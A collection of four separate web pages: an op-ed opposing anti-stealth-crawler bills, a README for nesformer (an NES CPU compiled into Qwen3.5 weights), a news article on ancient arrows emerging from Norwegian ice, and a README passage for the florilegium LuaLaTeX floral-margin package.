title: Breaking the Open Web Won’t Stop the Bad Bots | TechPolicy.Press
content:
PERSPECTIVE
Breaking the Open Web Won’t Stop the Bad Bots
LILA BAILEY, TESS VARTANIAN / OCT 27, 2026
A close up of a spider in its web. Valeriia Neganova/Unsplash
Republish
Share
Late last month, more than 300 representatives from major media outlets were on Capitol Hill to advocate for the Stealth Bot Prohibition Act. They came with a legitimate grievance. Newsrooms are being hit by a surge of automated traffic, mostly from AI developers. AI developers extract enormous volumes of online content and then potentially deprive website owners of referral traffic and ad revenue with generative AI features and chatbots trained on that content. It is a real problem that deserves a real solution. But this bill doesn’t directly target the harms caused by abusive crawling. Instead, it would force anyone accessing a website automatically to identify themselves and their purposes for collecting public information. Rather than protect journalists, the bill threatens a basic tool they, and many others, rely on to gather information online.
Cutting-edge investigative journalism relies on automated data collection. In 2022, a Pulitzer-winning Wall Street Journal investigation analyzed over 31,000 financial disclosures from 12,000 senior government employees, revealing that nearly a quarter of federal officials traded stock in industries their agencies regulated. To conduct an investigation at that scale, the Journal relied on web scraping: an automated process where a software bot, known as a crawler, browses the internet and collects information. This fundamental tool of the open web is now under threat from bills that purport to target “stealth crawling,” but in reality would hamper legitimate public-interest activities, including preservation, journalism, research, and security.
Again, aggressive, large-scale scraping is a real problem — particularly as demand for AI training and content has exploded. It can overwhelm websites, increase costs, and threaten institutions that produce and preserve knowledge, including commercial publishers, Wikipedia, libraries, and the Internet Archive, where one of the authors of this piece works.
In an apparent attempt to reduce or eliminate problematic scraping practices, proposed bills, like the federal Stealth Bot Prohibition Act and New York’s Stealth Crawler Prohibition Act, would impose sweeping prohibitions on anonymous scraping without addressing the real harms.
Both bills define a “bot” or “crawler” as software that “retrieves, scans, indexes, scrapes, or otherwise accesses a website or other internet source.” A bot is “stealth” if it fails to disclose its identity and the “specific nature and purpose of the bot.” Under the federal bill, the FTC can pursue penalties of up to $53,000 if a person uses a stealth bot in a way that is “reasonably likely to damage, impair, or burden” a website’s “technical or commercial operation.” The bill provides no definition or standard of what is reasonably likely to impair a website. Under the New York bill, which only applies to covered news sites, a publisher can obtain a subpoena to unmask a crawler’s identity without requiring a showing of any harm.
Knowing the identity behind a crawler tells us relatively little about whether its behavior is harmful. Under the New York bill, a company that discloses its identity and then accesses the website 10,000 times a minute complies with the law even though it is still imposing enormous and likely unjustified costs on the site. But a journalist anonymously using a crawler to investigate potentially anti-competitive practices by tech companies does not. Many of the most socially valuable uses of crawling require anonymity. Revealing a crawler’s identity and purposes can change the very nature of the information that is collected; if the subject of the study knows it is being observed and by whom, its behavior will change. That is the point of studying it anonymously.
Moreover, not all automated data collection is abusive, and not all of it is used to train AI, but these proposed bills risk deterring archivists, researchers, and civic technologists from using automated data collection tools out of fear of liability. Journalists use scraping to analyze public records, as in the WSJ story. Researchers use it to study online discrimination and misinformation.
The Internet Archive’s Wayback Machine has used crawlers to archive more than one trillion webpages, creating a historical record of the internet that would otherwise constantly change or disappear. That archival record has helped provide the factual background for thousands of news stories, evidence in hundreds of court cases across the country, and often simply a backup for when things go wrong.
It is not just archivists who rely on scraping to advance the public good. Disability advocates have used scraping to automatically evaluate over one million websites to detect accessibility problems. Public health researchers use scraping to track the opioid epidemic as well as misinformation surrounding addiction and treatment. The federal government relies on crawlers to scan for threat detection, offering free cybersecurity services to organizations across the country. And for some of these users, anonymity is essential to the integrity and safety of their work. For example, environmental researchers gathering information from public corporate disclosures or satellite image portals may fear retaliation from the companies they are investigating.
Our content delivered to your inbox.
Join our newsletter on issues and ideas at the intersection of tech & democracy
SUBSCRIBE
The First Amendment has historically protected us from government-imposed identification requirements tied to receiving information. In Lamont v. Postmaster General, the Supreme Court struck down a law requiring recipients to affirmatively identify themselves before receiving certain political publications. The same principle applies to web crawling: requiring people to identify themselves as a condition of accessing publicly available information burdens the freedom to receive information.
That concern is heightened when laws use vague language. If researchers cannot easily understand what it means to “deploy” a crawler in a prohibited way, or what activity is “reasonably likely to burden or impair a website,” they may refrain from scraping rather than risk violating the law.
As we wrote in our letter to New York Governor Kathy Hochul, “deanonymization threatens the core of the open web without actually addressing these technological and potential economic harms of AI-related crawling.” Unmasking a crawler does not reduce the number of requests it sends to a server. It does not compensate a publisher whose content is used to build an AI product. And it does not restore referral traffic that publishers may lose when users turn to an AI chatbot for information.
Indeed, existing laws can be used to address many harmful uses of scraped data. For example, privacy laws can restrict how sensitive data is processed. Copyright law can respond to infringing AI-generated outputs. Consumer protection law can address deceptive data collection or use.
To tackle the specific issues raised by aggressive AI scraping, policymakers could support the development of standardized, interoperable technical solutions to help websites better manage automated traffic. Standards bodies such as the Internet Engineering Task Force are exploring new protocols for managing machine access to online content and developing mechanisms for anonymous attestation of good crawler behavior. Policymakers should allow that work to develop rather than prematurely imposing legal and technical measures that harm “good” bots and that “bad” bots will quickly learn to evade.
And if policymakers conclude that new legislation is necessary, liability should turn on conduct that causes identifiable harms like overwhelming servers with excessive requests, engaging in fraud, or collecting data for prohibited uses.
The spread of AI crawling has created legitimate challenges for publishers and website operators requiring thoughtful policy responses. But policymakers should resist treating anonymity as something wrong in and of itself. The open web depends on the ability to access, analyze, and preserve publicly available information without revealing our identity and seeking permission from every website owner first.
Policymakers who want to curb abusive crawling while preserving a healthy information ecosystem have better options, and we are eager to help them. We invite legislators at the state and federal levels to reach out to us about how alternative proposals could target harmful conduct while protecting the tools that journalists, researchers, archivists, and citizens have long used to navigate the digital world.

title: GitHub - dbreunig/nesformer: An NES CPU compiled into the weights of a stock Qwen3.5 model · GitHub
content:
nesformer
An NES CPU compiled into the weights of a stock Qwen3.5 model.
The NES's 6502 CPU (the core of its 2A03 chip), its 2 KB of work RAM, and a cartridge's program ROM run inside a standard Qwen3_5ForCausalLM checkpoint. Nobody trained these weights; a compiler computed every one. When you play a game, the model predicts the CPU's execution log one token at a time. A small host program plays the rest of the console around it: it draws the picture, reads the controller, and fires the vblank interrupt.
nesformer builds on Qwenputer by Divyansh Agrawal, which compiled a CHIP-8 and then a RISC-V CPU into Qwen3.5-4B. It reuses Qwenputer's compiler and its central trick: the model's Gated DeltaNet state is the machine's memory.
Super Mario Bros. (World 1-1) Full Game by Doug Fraker (title screen and first level)
Every CPU token in these runs came from the model. For the bundled test games, every frame also matches a conventional 6502 emulator's output exactly (see How it was checked).
Quick start
1. Folder layout
Unzip nesformer.zip and nesformer-weights.zip into the same folder. The weights go next to the nesformer/ package, not inside it:
nesformer/              <- run commands from here
├── nesformer/          <- the Python package
├── chipformer/         <- Qwenputer's compiler
├── roms/               <- test ROMs (put your own here too)
├── examples/           <- sample GIFs and frame sheets
├── tests/
├── LICENSE
├── LICENSE.chipformer
├── README.md
├── pyproject.toml
└── weights/            <- from nesformer-weights.zip
    ├── config.json
    ├── generation_config.json
    ├── model.safetensors
    ├── nesformer.json
    └── SHA256SUMS
The CLI looks for weights/ beside the nesformer/ package. To keep the weights elsewhere, pass --weights /path/to/weights to run, check or trace, or give the path to info.
To confirm the weights unzipped correctly, run shasum -a 256 -c weights/SHA256SUMS from the top folder.
2. Install
You need Python 3.11 or newer.
python3 -m venv .venv
source .venv/bin/activate          # Windows: .venv\Scripts\activate
pip install numpy scipy numba pillow
3. Play a game
python -m nesformer run roms/thwaite.nes --frames 600 --show \
  --buttons "start@90-95+200-205,a@230-233+250-253+270-273+290-293+310-313+330-333+350-353+370-373+390-393+410-413+430-433+450-453+470-473+490-493+510-513+530-533+550-553+570-573+590-593"
--show draws each frame in your terminal as the model generates it. When the run ends, the CLI saves an animated GIF named after the ROM (here thwaite.gif) in the current folder.
Expect it to be slow. The first run spends about 20 seconds compiling the engine with numba. After that, a frame takes 1–6 seconds, so 600 frames (10 seconds of NES time) take around 25 minutes.
Playing your own ROMs
Point run at any .nes file that uses the NROM board (iNES mapper 0), such as Super Mario Bros., Donkey Kong or Excitebike. You supply the ROM; nesformer only ships the three freely licensed test ROMs in roms/.
python -m nesformer run roms/smb.nes --frames 600 --show \
  --buttons "start@60-65,right@200-600,a@250-265+300-315+360-375+420-435+480-495+540-555"
That script starts the game, then walks Mario right and jumps about once a second. The CLI loads the ROM into the model's state at startup, so the same weights run any NROM game without a rebuild. Games on other boards stop with a message: see Limitations.
Controller scripts
--buttons takes a comma-separated list of entries. Each entry names one or more buttons joined by +, then @, then one or more frame ranges joined by +:
start@60-65                 press Start during frames 60 to 65
right@200-600               hold Right from frame 200 to frame 600
a@250-265+300-315           press A twice
right+b@200-600             hold Right and B together (run, in Super Mario Bros.)
The buttons are a, b, select, start, up, down, left and right. Frames count from power-on at 60 per second, so frame 600 is 10 seconds in. Games ignore input on screens where you can't move, so holding a button a little early does no harm. In Super Mario Bros., a longer A press makes a higher jump.
Commands
Command What it does
python -m nesformer run ROM Play a ROM on the weights and save a GIF
python -m nesformer check ROM Run the weights and the reference CPU side by side; stop at the first difference
python -m nesformer trace ROM Print the model's token stream (default 40 tokens)
python -m nesformer build Compile the circuit and write weights/ (about 10 seconds)
python -m nesformer info Describe the checkpoint
Options for run:
Option Default Meaning
--frames N 120 Stop after N frames
--buttons SCRIPT none Controller input (see above)
--show off Draw frames in the terminal (needs 24-bit color, e.g. iTerm2 or Windows Terminal)
--gif PATH ROM name Where to save the animated GIF
--png DIR off Save each kept frame as a PNG in DIR. With --png alone, no GIF is saved. Add --gif to get both.
--every N 1 Keep every N-th frame
--scale N 2 Enlarge saved frames N times
--engine fast fast (numba), numpy, or hf (stock transformers; needs torch, ~10 tokens/s)
--no-skip off Run every iteration of idle wait loops (slower; identical frames)
--max-tokens N none Stop after N tokens
--trace FILE none Save the token ids
run, check and trace all accept --weights, --engine, --buttons and --no-skip. check --tokens N sets how far to compare (default 50,000). trace --tokens N sets how many tokens to print (default 40). build --out DIR writes the checkpoint somewhere other than weights/.
How it works
What's in the weights, and what isn't
In the model (weights + DeltaNet state) In the host (nesformer/host.py)
The 6502 core: all 151 official opcodes, every addressing mode, flags, stack, BRK and NMI entry The PPU: a scanline renderer and the palette
2 KB of work RAM Controllers; APU registers (written, otherwise ignored)
32 KB of PRG-ROM, stored twice: one copy for instruction fetch, one for data reads NMI timing at vblank, injected as an NMI token
OAM DMA reads (the 256 bytes appear as DM tokens) Answers to I/O reads, injected as IN tokens
This split follows Qwenputer's CHIP-8 build, whose host injects timer ticks and draws the display from the trace. The host never sees the CPU's registers or RAM except through the trace.
The memory trick works like this. Each DeltaNet head keeps a 128 × 128 state matrix that the delta rule updates at every token. With the gate held open and a one-hot key, an update overwrites exactly one row of that matrix, and a one-hot query reads it back. So every row is a memory cell, and the cartridge, RAM and registers all live in rows.
The checkpoint
weights/ is an ordinary Hugging Face folder. It loads with Qwen3_5ForCausalLM.from_pretrained and needs no custom code.
Architecture Qwen3_5ForCausalLM, with Qwen3.5-4B's DeltaNet head shapes (16 key heads, 32 value heads, dim 128) and MLP width (9,216)
Layers 7 Gated DeltaNet layers (the circuit), plus 1 all-zero attention layer that Hugging Face's cache needs
Hidden size 768
Vocabulary 263,808 tokens
Parameters 466.6M in bf16 (933 MB), of which 9.3M are nonzero, so the weights zip to 3.3 MB
nesformer.json records which layer and head holds each part of the machine. A run writes the cartridge, registers and RAM into those DeltaNet states, then decodes greedily.
Layer plan
Layer Attention (state) MLP
1 PC anchor; instruction counters; A, X, Y, SP; flags N V Z C I D; pointer latches; NMI flag counter thermometers; SP ± 1; LO + Y
2 — PC = anchor + bytes executed since; PC + 1, PC + 2
3 PRG fetch: opcode and two operand bytes at the PC opcode decode; operand bits; indexed sums; branch test and target
4 — effective address, by addressing mode and record stage; the byte a push stores
5 RAM and PRG data reads at the effective address operand; ADC/SBC adder, compares, BIT; address decode
6 — result byte, carry, overflow, flags, jump targets
7 — the next token
The trace
Each instruction becomes a record, and the record's last token commits it. As in Qwenputer's RISC-V core, the PC is implied rather than written: each final token carries its instruction's length, three DeltaNet counters tally the instructions of each length since the last jump, and the PC is the jump target plus that offset. Excerpts from Full Game:
SEI            P(000100 px0 L1)
LDX #$40       X($40 c0 v0 px0 L2)
STX $4017      IOW($4017=$40 L3)
TXS            S($FF L1)
BIT $2002      IOR($2002) IN($00) P(000110 px0 L3)       <- the host injects IN
BPL $8017      J($8017)
JSR $8279      PSH($FE) PSH($FD) J($8279)                 <- the return address is pushed in-circuit
RTS            PUL($FC) LO($7B) PUL($FD) J($827C)
STA ($72),Y    LO($08) HI($03) ST($00 a7=0 L2)            <- pointer bytes latched, then the store
STA $4014      IOW($4014=$02 L0) DM(0:$FF) … DM(255:$00) NT(L3)   <- OAM DMA
Most instructions take a single token; real game code averages 1.1–1.3 tokens per instruction. nesformer/spec.py documents every token family.
How it was checked
The reference CPU (nesformer/cpu.py) matches nestest's golden log for 3,348 instructions, and the py65 emulator on 5.7 million instructions of game code.
The exact circuit, run in Qwenputer's evaluator with its bf16 exactness checks, predicts every reference token: all of nestest plus 283,610 positions of two games' boot sequences.
The checkpoint in stock transformers (bf16, CPU) predicts 2,651 positions of nestest and Full Game with no mismatches.
The weights, free-running, generate traces identical to the reference CPU's:
Run Tokens Frames NES time Result
nestest (official opcodes) 4,586 — — identical, ending in the expected HALT
Thwaite, check 700,000 271 4.5 s identical trace and frames
Thwaite, run 1,916,527 600 10.0 s all 300 saved frames match
Full Game, run 2,645,885 420 7.0 s all 210 saved frames match
The idle-loop skip changes nothing visible: frames and I/O writes, cycle timestamps included, match a run without it.
Speed
The default engine computes Qwen3.5's forward pass from model.safetensors, compiled with numba and skipping the all-zero blocks. It ran at about 1,650 tokens/s on one CPU core of the machine it was built on. The plain numpy engine does about 210, and stock transformers about 10. A real NES would need about 700,000 tokens per second.
Games spend most of each frame in a loop that waits for vblank. When the host sees a loop body repeat exactly, with no RAM or I/O writes, it advances the clock to just before the next PPU event, and the remaining iterations still run. That cuts the token count by 2.6× to 4.2×. Overall, nesformer runs 150–290× slower than the real console.
Limitations
NROM cartridges only (iNES mapper 0). The CPU can address only 32 KB of program ROM at a time. Bigger games carry a bank-switching chip (a mapper, such as MMC1 or MMC3) that swaps which part of the ROM the CPU sees. nesformer's ROM reads happen inside the model, from a fixed 32 KB table, so it can't follow a bank switch yet. Supporting a mapper means storing the whole ROM in the state, keeping the bank registers there too, and adding one stage that turns each CPU address into a ROM address.
Official opcodes only. An unofficial opcode emits HALT.
Code must run from the cartridge ROM. A jump into RAM emits HALT.
No IRQs (APU frame IRQ, DMC). BRK and NMI work.
Read-modify-write instructions on I/O registers don't produce an I/O write, and $4020–$7FFF reads as 0 (no PRG-RAM).
The PPU and APU aren't in the weights. The PPU renders one scanline at a time, so mid-scanline effects aren't reproduced. Sprite-0 hit and sprite overflow are approximate, and there's no sound.
Tests
pip install pytest py65
python -m pytest -q tests
The tests take a few minutes. They check the reference CPU against nestest's log, the circuit against the reference, the weights free-running against the reference, and the idle-loop skip.
Running the checkpoint in stock transformers
pip install "torch>=2.6" "transformers>=5.22"
python -m nesformer run roms/thwaite.nes --frames 3 --engine hf
nesformer/hfcheck.py shows the whole procedure: load the checkpoint, decode one padding token, write the machine's state into the cache's DeltaNet states, then feed tokens one at a time.
Files
Path Contents
nesformer/spec.py token families and records
nesformer/cpu.py the reference 6502 that writes the trace
nesformer/host.py everything around the CPU: PPU, controllers, NMI timing, cycle counting, idle skip
nesformer/core.py the circuit and the state snapshot
nesformer/weights.py the emitter that turns the circuit into a Qwen3_5ForCausalLM checkpoint
nesformer/engine.py, fastengine.py run the weights (numpy / numba)
nesformer/hfcheck.py run the weights in stock transformers
nesformer/run.py, check.py, cli.py, __main__.py drivers, the teacher-forced check, the CLI
chipformer/ Qwenputer's q35 compiler (q35/ emitter and primitives, dsl/ graph)
weights/ the compiled checkpoint and its SHA-256 checksum
roms/ test ROMs; roms/SOURCES.md lists their authors and licenses
examples/ GIFs and frame sheets from the runs; demo.gif is the Super Mario Bros. run shown at the top
tests/test_nesformer.py the test suite
Credits
Qwenputer and its chipformer compiler: MIT, © 2026 Divyansh Agrawal (LICENSE.chipformer). That license also covers the code adapted from Qwenputer in nesformer/core.py and nesformer/weights.py. Its last paragraph refers to Qwenputer's CHIP-8 ROMs, which this repository does not include.
Test ROMs: nestest by Kevin Horton; Full Game by Doug Fraker (MIT); Thwaite by Damian Yerrick (GPL-3.0, source at pinobatch/thwaite-nes).
License
nesformer is released under the MIT License (see LICENSE). The ROMs in roms/ keep their own licenses, listed in roms/SOURCES.md.

title: 6,000-year-old Stone Age arrows emerge from melting ice in Norway
content:
The oldest ice is disappearing: The Stone Age is emerging from the melting ice
'We have been at the edge of the ice. We have seen it happening. And we are witnesses to a rapidly changing archaeological landscape,' write the glacial archaeologists. Finds from the Viking Age are becoming scarce, while 6,000-year-old arrowheads are now emerging from the melting ice.
A 5,000-year-old arrowhead made of slate, found together with parts of its shaft right at the edge of the ice. Domesticated reindeer can be seen on the ice patch in the background. (Photo: Åsa Rommetveit Celius / Innlandet County Municipality / Secrets of the Ice)
Ida Irene Bergstrøm
JOURNALIST
PUBLISHED 26 September 2026 - 00:01
For exactly 20 years, archaeologists working with Secrets of the Ice have been recovering and preserving artefacts emerging from the ice in the mountains of Innlandet, eastern Norway.
Until now, most of the objects have been up to 2,000 years old. Many date from the Viking Age.
But the ancient ice is now beginning to melt.
And within this oldest ice lie the oldest finds: large quantities of arrow shafts and arrowheads from the Bronze Age and the Stone Age.
A bone arrowhead found together with parts of its shaft right beside the ice. Approximately 5,000 years old. (Photo: Frys Film / Innlandet County Municipality / Secrets of the Ice)
An arrowhead made from a freshwater mussel shell, dating from the Bronze Age, approximately 3,600 years old. The arrowhead is fragile and has begun to split apart. (Photo: Frys film / Innlandet County Municipality / Secrets of the Ice)
Here comes the Stone Age
ANNONSE
One of the oldest finds from this year's first field expedition is an arrow with an arrowhead and shaft made of slate.
By comparing it with previously discovered arrows, archaeologists estimate that it is between 5,000 and 6,000 years old.
The fact that arrows are emerging from the melting ice is not surprising. Over the 20 years they have been working here, the archaeologists have found extensive evidence of reindeer and reindeer hunting. They have also found clothing, shoes, dead packhorses, and a pair of skis.
The preservation conditions in the ice have meant that organic material, such as wood, leather, and textiles, have also survived.
“This year, we found 48 prehistoric arrows. That's a lot,” Espen Finstad, who leads Secrets of the Ice, tells Science Norway.
He explains that, with these latest discoveries, more than 100 arrowheads and arrow shafts have now been recovered from a single ice patch over the years.
The oldest arrowheads are made from slate, freshwater mussel shells, and bone. More recent arrowheads are made from iron and are 'only' between 1,000 and 1,500 years old.
Archaeologist Åsa Rommetveit Celius from Innlandet County Municipality documents the discovery of a 1,000-year-old arrow shaft. (Photo: May-Tove Smiseth / Innlandet County Municipality / Secrets of the Ice)
Archaeologist Kjetil Loftsgarden from the Museum of Cultural History in Oslo holds a complete 1,800-year-old arrow with a bone arrowhead and a wooden shaft. (Photo: Espen Finstad / Innlandet County Municipality / Secrets of the Ice)
A brutal backdrop
But this year’s fieldwork carries an added sense of gravity.
Finstad explains that the work of recovering archaeological artefacts from the ice has always carried a certain duality.
“It’s fun going around looking for things. It’s exciting, and finding something is just really cool," he says.
Yet behind the excitement lies the reality of climate change. Finstad points to the recent landslide in Nepal and the glacier collapse in Jotunheimen.
“We have always acknowledged this contradiction and the reality behind our work. But this is the first time it has truly affected us on an emotional level,” Finstad says, adding:
“This year, there was a much deeper sense of seriousness and sadness. Only patches of ice remain where we once had large ice patches. It's brutal. And this year, that reality struck us more forcefully than ever before."
ANNONSE
Participants in the field from the Glacier Archaeology Programme in Innlandet, Secrets of the Ice. (Photo: Frys Film / Innlandet County Municipality / Secrets of the Ice)
The glacial archaeologists’ tent camp in Jotunheimen at sunrise. Fresh snow on the ground. (Photo: Espen Finstad / Innlandet County Municipality / Secrets of the Ice)
Finstad and his colleagues estimate that most of the ice patches containing archaeological artefacts will have disappeared within the next 20 years.
“There has been ice here for 6,000–7,000 years. Nature has been warning us and sending signals for many years. But now it's giving up. Now it is simply going to melt,” says the glacial archaeologist.
'For thousands of years, ancient ice has safely preserved unique objects from the past. Now that ice is disappearing,' the archaeologists write in a press release about the finds. 'We have been at the edge of the ice. We have seen it happening. And we are witnesses to a rapidly changing archaeological landscape.'
The lower section of one of the ice patches at Hanklefonne. It was once large. Now only a small, steep section remains. 'The ice is disappearing much faster than we expected. The landscape has changed dramatically, and large areas that were recently covered by ice are now ice-free,' the glacial archaeologists write in a press release. (Photo: Espen Finstad / Innlandet County Municipality / Secrets of the Ice)
More fieldwork ahead
Finstad and his colleagues are planning more fieldwork in the coming weeks, weather permitting.
So far, they have secured finds in the Kvittingskjølen mountain area of Jotunheimen, specifically at Langfonne, Storefonne, and Hanklefonne.
Several of the finds are already on display at the Norwegian Mountain Centre in Lom, just a few days after they were discovered.
———
Translated by Alette Bjordal Gjellesvik

title: GitHub - kevinraymond/florilegium: Procedurally generated Delft-blue floral page margins for LuaLaTeX, drawn in Lua · GitHub
content:
florilegium
Origin
The Reddit post asked how to make flowers like these in LaTeX. I don't know how the original was made. This project is one possible way, and the way I did it uses hand-authored primitives with randomized parameters, painted in Lua and placed by a procedural layout whose "fill the unused space" part borrows a 1998 idea from the ornament literature. It gets a similar look, but I explicitly tried to not replicate the original.
This project was made with the assistance of AI (Claude), and I'm sharing the process I used to bring it to life.
What it is
Procedurally generated Delft-blue floral page margins for LaTeX. No images, no imported paths, no external assets: every petal, leaf and stem is a parametric curve computed in Lua while the page is being written, painted like a watercolor, and written straight into the PDF. Every page gets its own garden.
Six seeds of the grown composition. Same code, different seed — and the garden fills whatever space the text leaves free.
Two documents share one package, and two more (showcase.tex, spread.tex) show what else it does:
florilegium.tex florilegium-grow.tex
composition authored: stems, leaves and flowers placed by hand, every parameter sampled grown: a plant grown to fit the page by a greedy space-filling loop
adapts to nothing (tuned for A4, 68 mm margin) the page layout, and the free space below the text on the last page
preview
Both PDFs are self-describing: the body text is the write-up of how the margin is drawn.
Last page of the grown document: the text ends early, so branches arch into the space below.
300 dpi crop. Mottled washes with white streaks lifted out, lobed leaves with white veins, forget-me-not cymes, a pale ghost flower behind the stems.
Watch it grow
as it grows with the free space it fills
Seed 6, from an empty margin to the finished page. The stems rise first, leaves open as the tips pass their nodes, and each stem ends in a flower. Then the greedy loop takes over: on the right, each dashed circle is the largest free disc it found, just before a branch grows to it. Big holes come first and slowly, small ones last and fast. The butterflies and bees fly in, the bird glides onto its twig, and the snail crawls up its stem until the last frame, which is exactly the page this seed always gives.
The growth is recorded once, while the page is laid out: each stem is also drawn as prefixes of increasing length and each motif at a few smaller scales, replaying the same random draws. A frame then writes the pieces whose time has come, in their original painting order. make grow-6 renders one seed this way (build/grow-6.gif and .mp4, about 45 seconds); add EXPLAIN=1 for the dashed circles.
The margin reads the text
showcase.tex, "A year in the margin": spring on the first page, summer, autumn on the last. Each section describes the feature it shows.
The grown margin can respond to the document around it:
Initials. \florilegiuminitial[5]{E} sets the first letter of a paragraph in a tile five lines tall. The outline of the letter is read from an OpenType font (Latin Modern Bold by default) and painted like a petal; a vine passes over and under its strokes in turn, with leaves where they fit and flowers in the gaps, often in the letter's counters. The letter is also typeset invisibly, so the paragraph still copies as "Every".
Flowers at the headings. With the option sections, every numbered section and subsection gets a flower in the margin beside its heading, painted in the copper of the accents, the way headings were once picked out in red.
A flower where the text asks. \florilegiumbloom puts a flower beside the line it stands in; \florilegiumbloom[lily] asks for any motif of the garden. The marks are found in the page box when the page is shipped out, so this works in one run.
Seasons. With the option aging, the garden ages from spring on the first page (mostly in bud, small pale leaves) to autumn on the last (seed heads, falling petals, a few copper leaves). It needs two runs, for the page count; \florilegiumage{0.8} sets an age by hand instead.
One seed in spring, early summer, late summer and autumn. The seasons change what grows, not where.
Visitors
Most pages have visitors: a butterfly or two and bees in the open spaces, a snail crawling up one of the main stems, and on about one page in five a bird perched on a twig of its own. They come from a random stream of their own, so a page without them is exactly the page it would have been; the option novisitors leaves them out.
Any ink
The whole palette comes from one color, ink: Delft blue, sepia, green, crimson, violet, teal. The ramp from the darkest stroke to the palest wash is computed from that hue in OKLCH, so the light end never turns gray.
Themes
Seed 6 three times: as it always grew, with theme=geometric, and with theme=math.
The growth loop never knew what it was drawing. It reads a table of motifs (the size of the disc each one takes, a weight, a function that draws it) and calls every primitive by name. A theme is one Lua file, theme-<name>.lua, that replaces some of those primitives and may add rows to the table, or brings a composition of its own.
theme=geometric is the same plant cut from flat shapes (theme-geometric.lua). It grows exactly as the flowers do, and only the drawing changes: the stems run straight between their nodes, the leaves are kites and toothed polygons folded into a light and a dark facet with straight white veins, the flowers are rosettes of rhombi or layered star polygons, the tendrils square spirals, the bird and the butterfly low-poly. The colors are flat tones of the ink, with no wash; crystals (Platonic solids, flat-shaded like cut stones) grow among the flowers. A page is about a tenth of the size of a flora page.
theme=math is no plant at all (theme-math.lua, drawing from figures.lua): mathematics cascading down the margin and across the bottom of the page, overlapping a little so it blends. A large figure sits in the corner where the column meets the bottom (an Apollonian gasket, a deep Koch snowflake, Vogel's disc, a polyhedron). Down the column run one or two families, figures that change as they go, joined by small copper arrows: the Koch snowflake gaining a level, a polygon gaining sides on its way to the circle, the cube truncating into the octahedron, chords k → mk mod n turning from a cardioid into a nephroid, Vogel's disc packing evenly only at the golden angle. Equations that hold (e^{iπ} + 1 = 0, V − E + F = 2, ...) run along the bottom and under the text on the last page, and everything else, largest hole first, is figures (Platonic solids, knots, Hilbert curves, Lissajous curves, hypotrochoids, Maurer roses, the Petersen graph, ...), letters, numerals and symbols set by TeX at many sizes and a slight tilt, and dots. It fills whatever space the page leaves, like the garden; density sets how much there is.
\usepackage[grown,theme=geometric]{florilegium}   % or theme=math; the whole document
\florilegiumtheme{math}                            % or from the page this stands on
A document without a theme comes out byte for byte as it did before themes existed.
Less in the margin
Seed 6 at density=1, 0.5, 0.2 and 0.05, and at intensity=0.5.
A full garden is a lot to have beside an equation. Two options turn it down, with any theme:
density=0.4 grows less: the loop stops at larger holes, keeps more paper around each motif, and hangs fewer leaves and fillers. Low on the dial the plant itself thins out: two main stems, then one, no footer; at 0.05 it is a single vine with its flower, a couple of leaves and one or two sprays. With the math theme it means fewer things.
intensity=0.5 paints the whole margin paler, the same way the ghost flowers behind the garden are painted. It changes only the color, not the detail.
\usepackage[grown,density=0.4,intensity=0.6]{florilegium}
At the defaults (1 and 1) every page is exactly the page it was before.
One ornament in the text
Or no margin at all: \florilegiumornament{leaf} sets one primitive in the line, in a box the size of a letter, for example to open a paragraph. Each ornament in a document gets a shape of its own and keeps it from one build to the next; seed=random draws a new one every time the PDF is built, and seed=7 a fixed one.
\usepackage[nomargin]{florilegium}       % ornaments only, no garden in the margin
\florilegiumornament{leaf} A paragraph that opens with a leaf.
\florilegiumornament[size=2.4em, ink=5B2A1F, angle=30, seed=random]{flower}
Any primitive works (leaf, leaflet, flower, blossom, bud, bell, lily, cyme, umbel, butterfly, bee, bird, hedera, sparkle, ...), and so do the current theme's (crystal with geometric; knot, polyhedron, koch, ... with math).
Both sides of the page
spread.tex, pages 2 and 3: a two-sided document with a wide outer margin. The garden grows on the left of the left-hand page and, mirrored, on the right of the right-hand page. The last page also switches to the geometric theme.
The garden grows in whichever side margin is wider, so there is nothing to set. In a two-sided document (twoside with a wide outer margin) it changes sides with the page. A one-sided document with a wide right margin gets it on the right of every page. A mirrored page is laid out as if seen in a mirror, then drawn through a reflection: the last transform that every point already passes through. It is exactly the reflection of the garden the same seed would grow on the left.
In PostScript
postscript/florilegium.ps: the grown margin in pure PostScript, one self-contained file. Ghostscript, or a printer, computes every petal while it interprets the page, and the two pages of text explain how.
The drawing core, every primitive and the growth loop are ported from ink.lua, flora.lua and grow.lua, procedure for procedure. It needs no TeX and no other file:
gs -dALLOWPSTRANSPARENCY -sDEVICE=pdfwrite -dSeed=7 -o garden.pdf postscript/florilegium.ps
make postscript             # the same -> build/postscript-7.pdf; SEED=12 for another garden
-dSeed=N picks the garden; without it the clock picks one, so every print is new. -dAge=0 to 1 sets the season, and -dNoVisitors leaves out the butterflies, bees, snail and bird. Two pages take about 2.5 seconds. Much of the Lua maps directly: PostScript's own transformation matrix places each primitive (translate, rotate, scale), paths and Bézier curves are native, and procedures built at run time stand in for Lua's closures (a petal's half-width is a procedure handed to the outline builder). Four things don't map:
Layers. The garden grows in one order but is painted back to front, so every fill and stroke is captured with pathforall into a list per layer, and the lists are played back at the end.
Transparency. PostScript has none. Ghostscript provides it with -dALLOWPSTRANSPARENCY. Without that flag, or on a printer, each translucent fill is mixed with the color it is likely to land on and painted opaque. The result is flatter, but it's the same garden.
Randomness. The generator is Park-Miller in 32-bit integer arithmetic, and PostScript reals are single precision, so seed 7 here is a different garden from seed 7 in LaTeX.
Text. The file typesets its own two pages in Times. It knows where its headings are and where its text ends, so the copper flowers at the headings and the garden under the last line work as they do in LaTeX. It has no initials, animation, themes, mirrored pages, density or intensity, ornaments in the text, or authored composition.
The file sent twice to an Epson inkjet with lp postscript/florilegium.ps, with no seed given. The computer's print system runs the program again for each job, so each print takes its seed from the clock and grows a different garden. A printer gets the opaque version, as it has no transparency.
Build
LuaLaTeX, one pass, about a second a page (two passes for showcase.tex, whose seasons need the page count).
make                        # the four PDFs
make seed-7                 # one page from seed 7 -> build/seed-7.pdf
make gallery                # gallery/seeds.png + seeds.gif, inks.png, seasons.png, themes.png, dials.png (python3, Pillow, pdftoppm)
make grow-6                 # growth animation of seed 6 -> build/grow-6.gif + .mp4 (ffmpeg)
make grow-6 EXPLAIN=1       # the same with the free discs marked -> build/grow-6-explain.*
No TeX installed? Build the image once and run everything in it:
docker build -t florilegium-tex tools
make RUN=tools/in-docker
Or paste florilegium.sty, the nine .lua files and one of the .tex files into an Overleaf project and set the compiler to LuaLaTeX.
Use it in your own document:
\usepackage[grown]{florilegium}      % or plain \usepackage{florilegium} for the authored one
% options for the grown one: sections (flowers at the headings), aging (two runs),
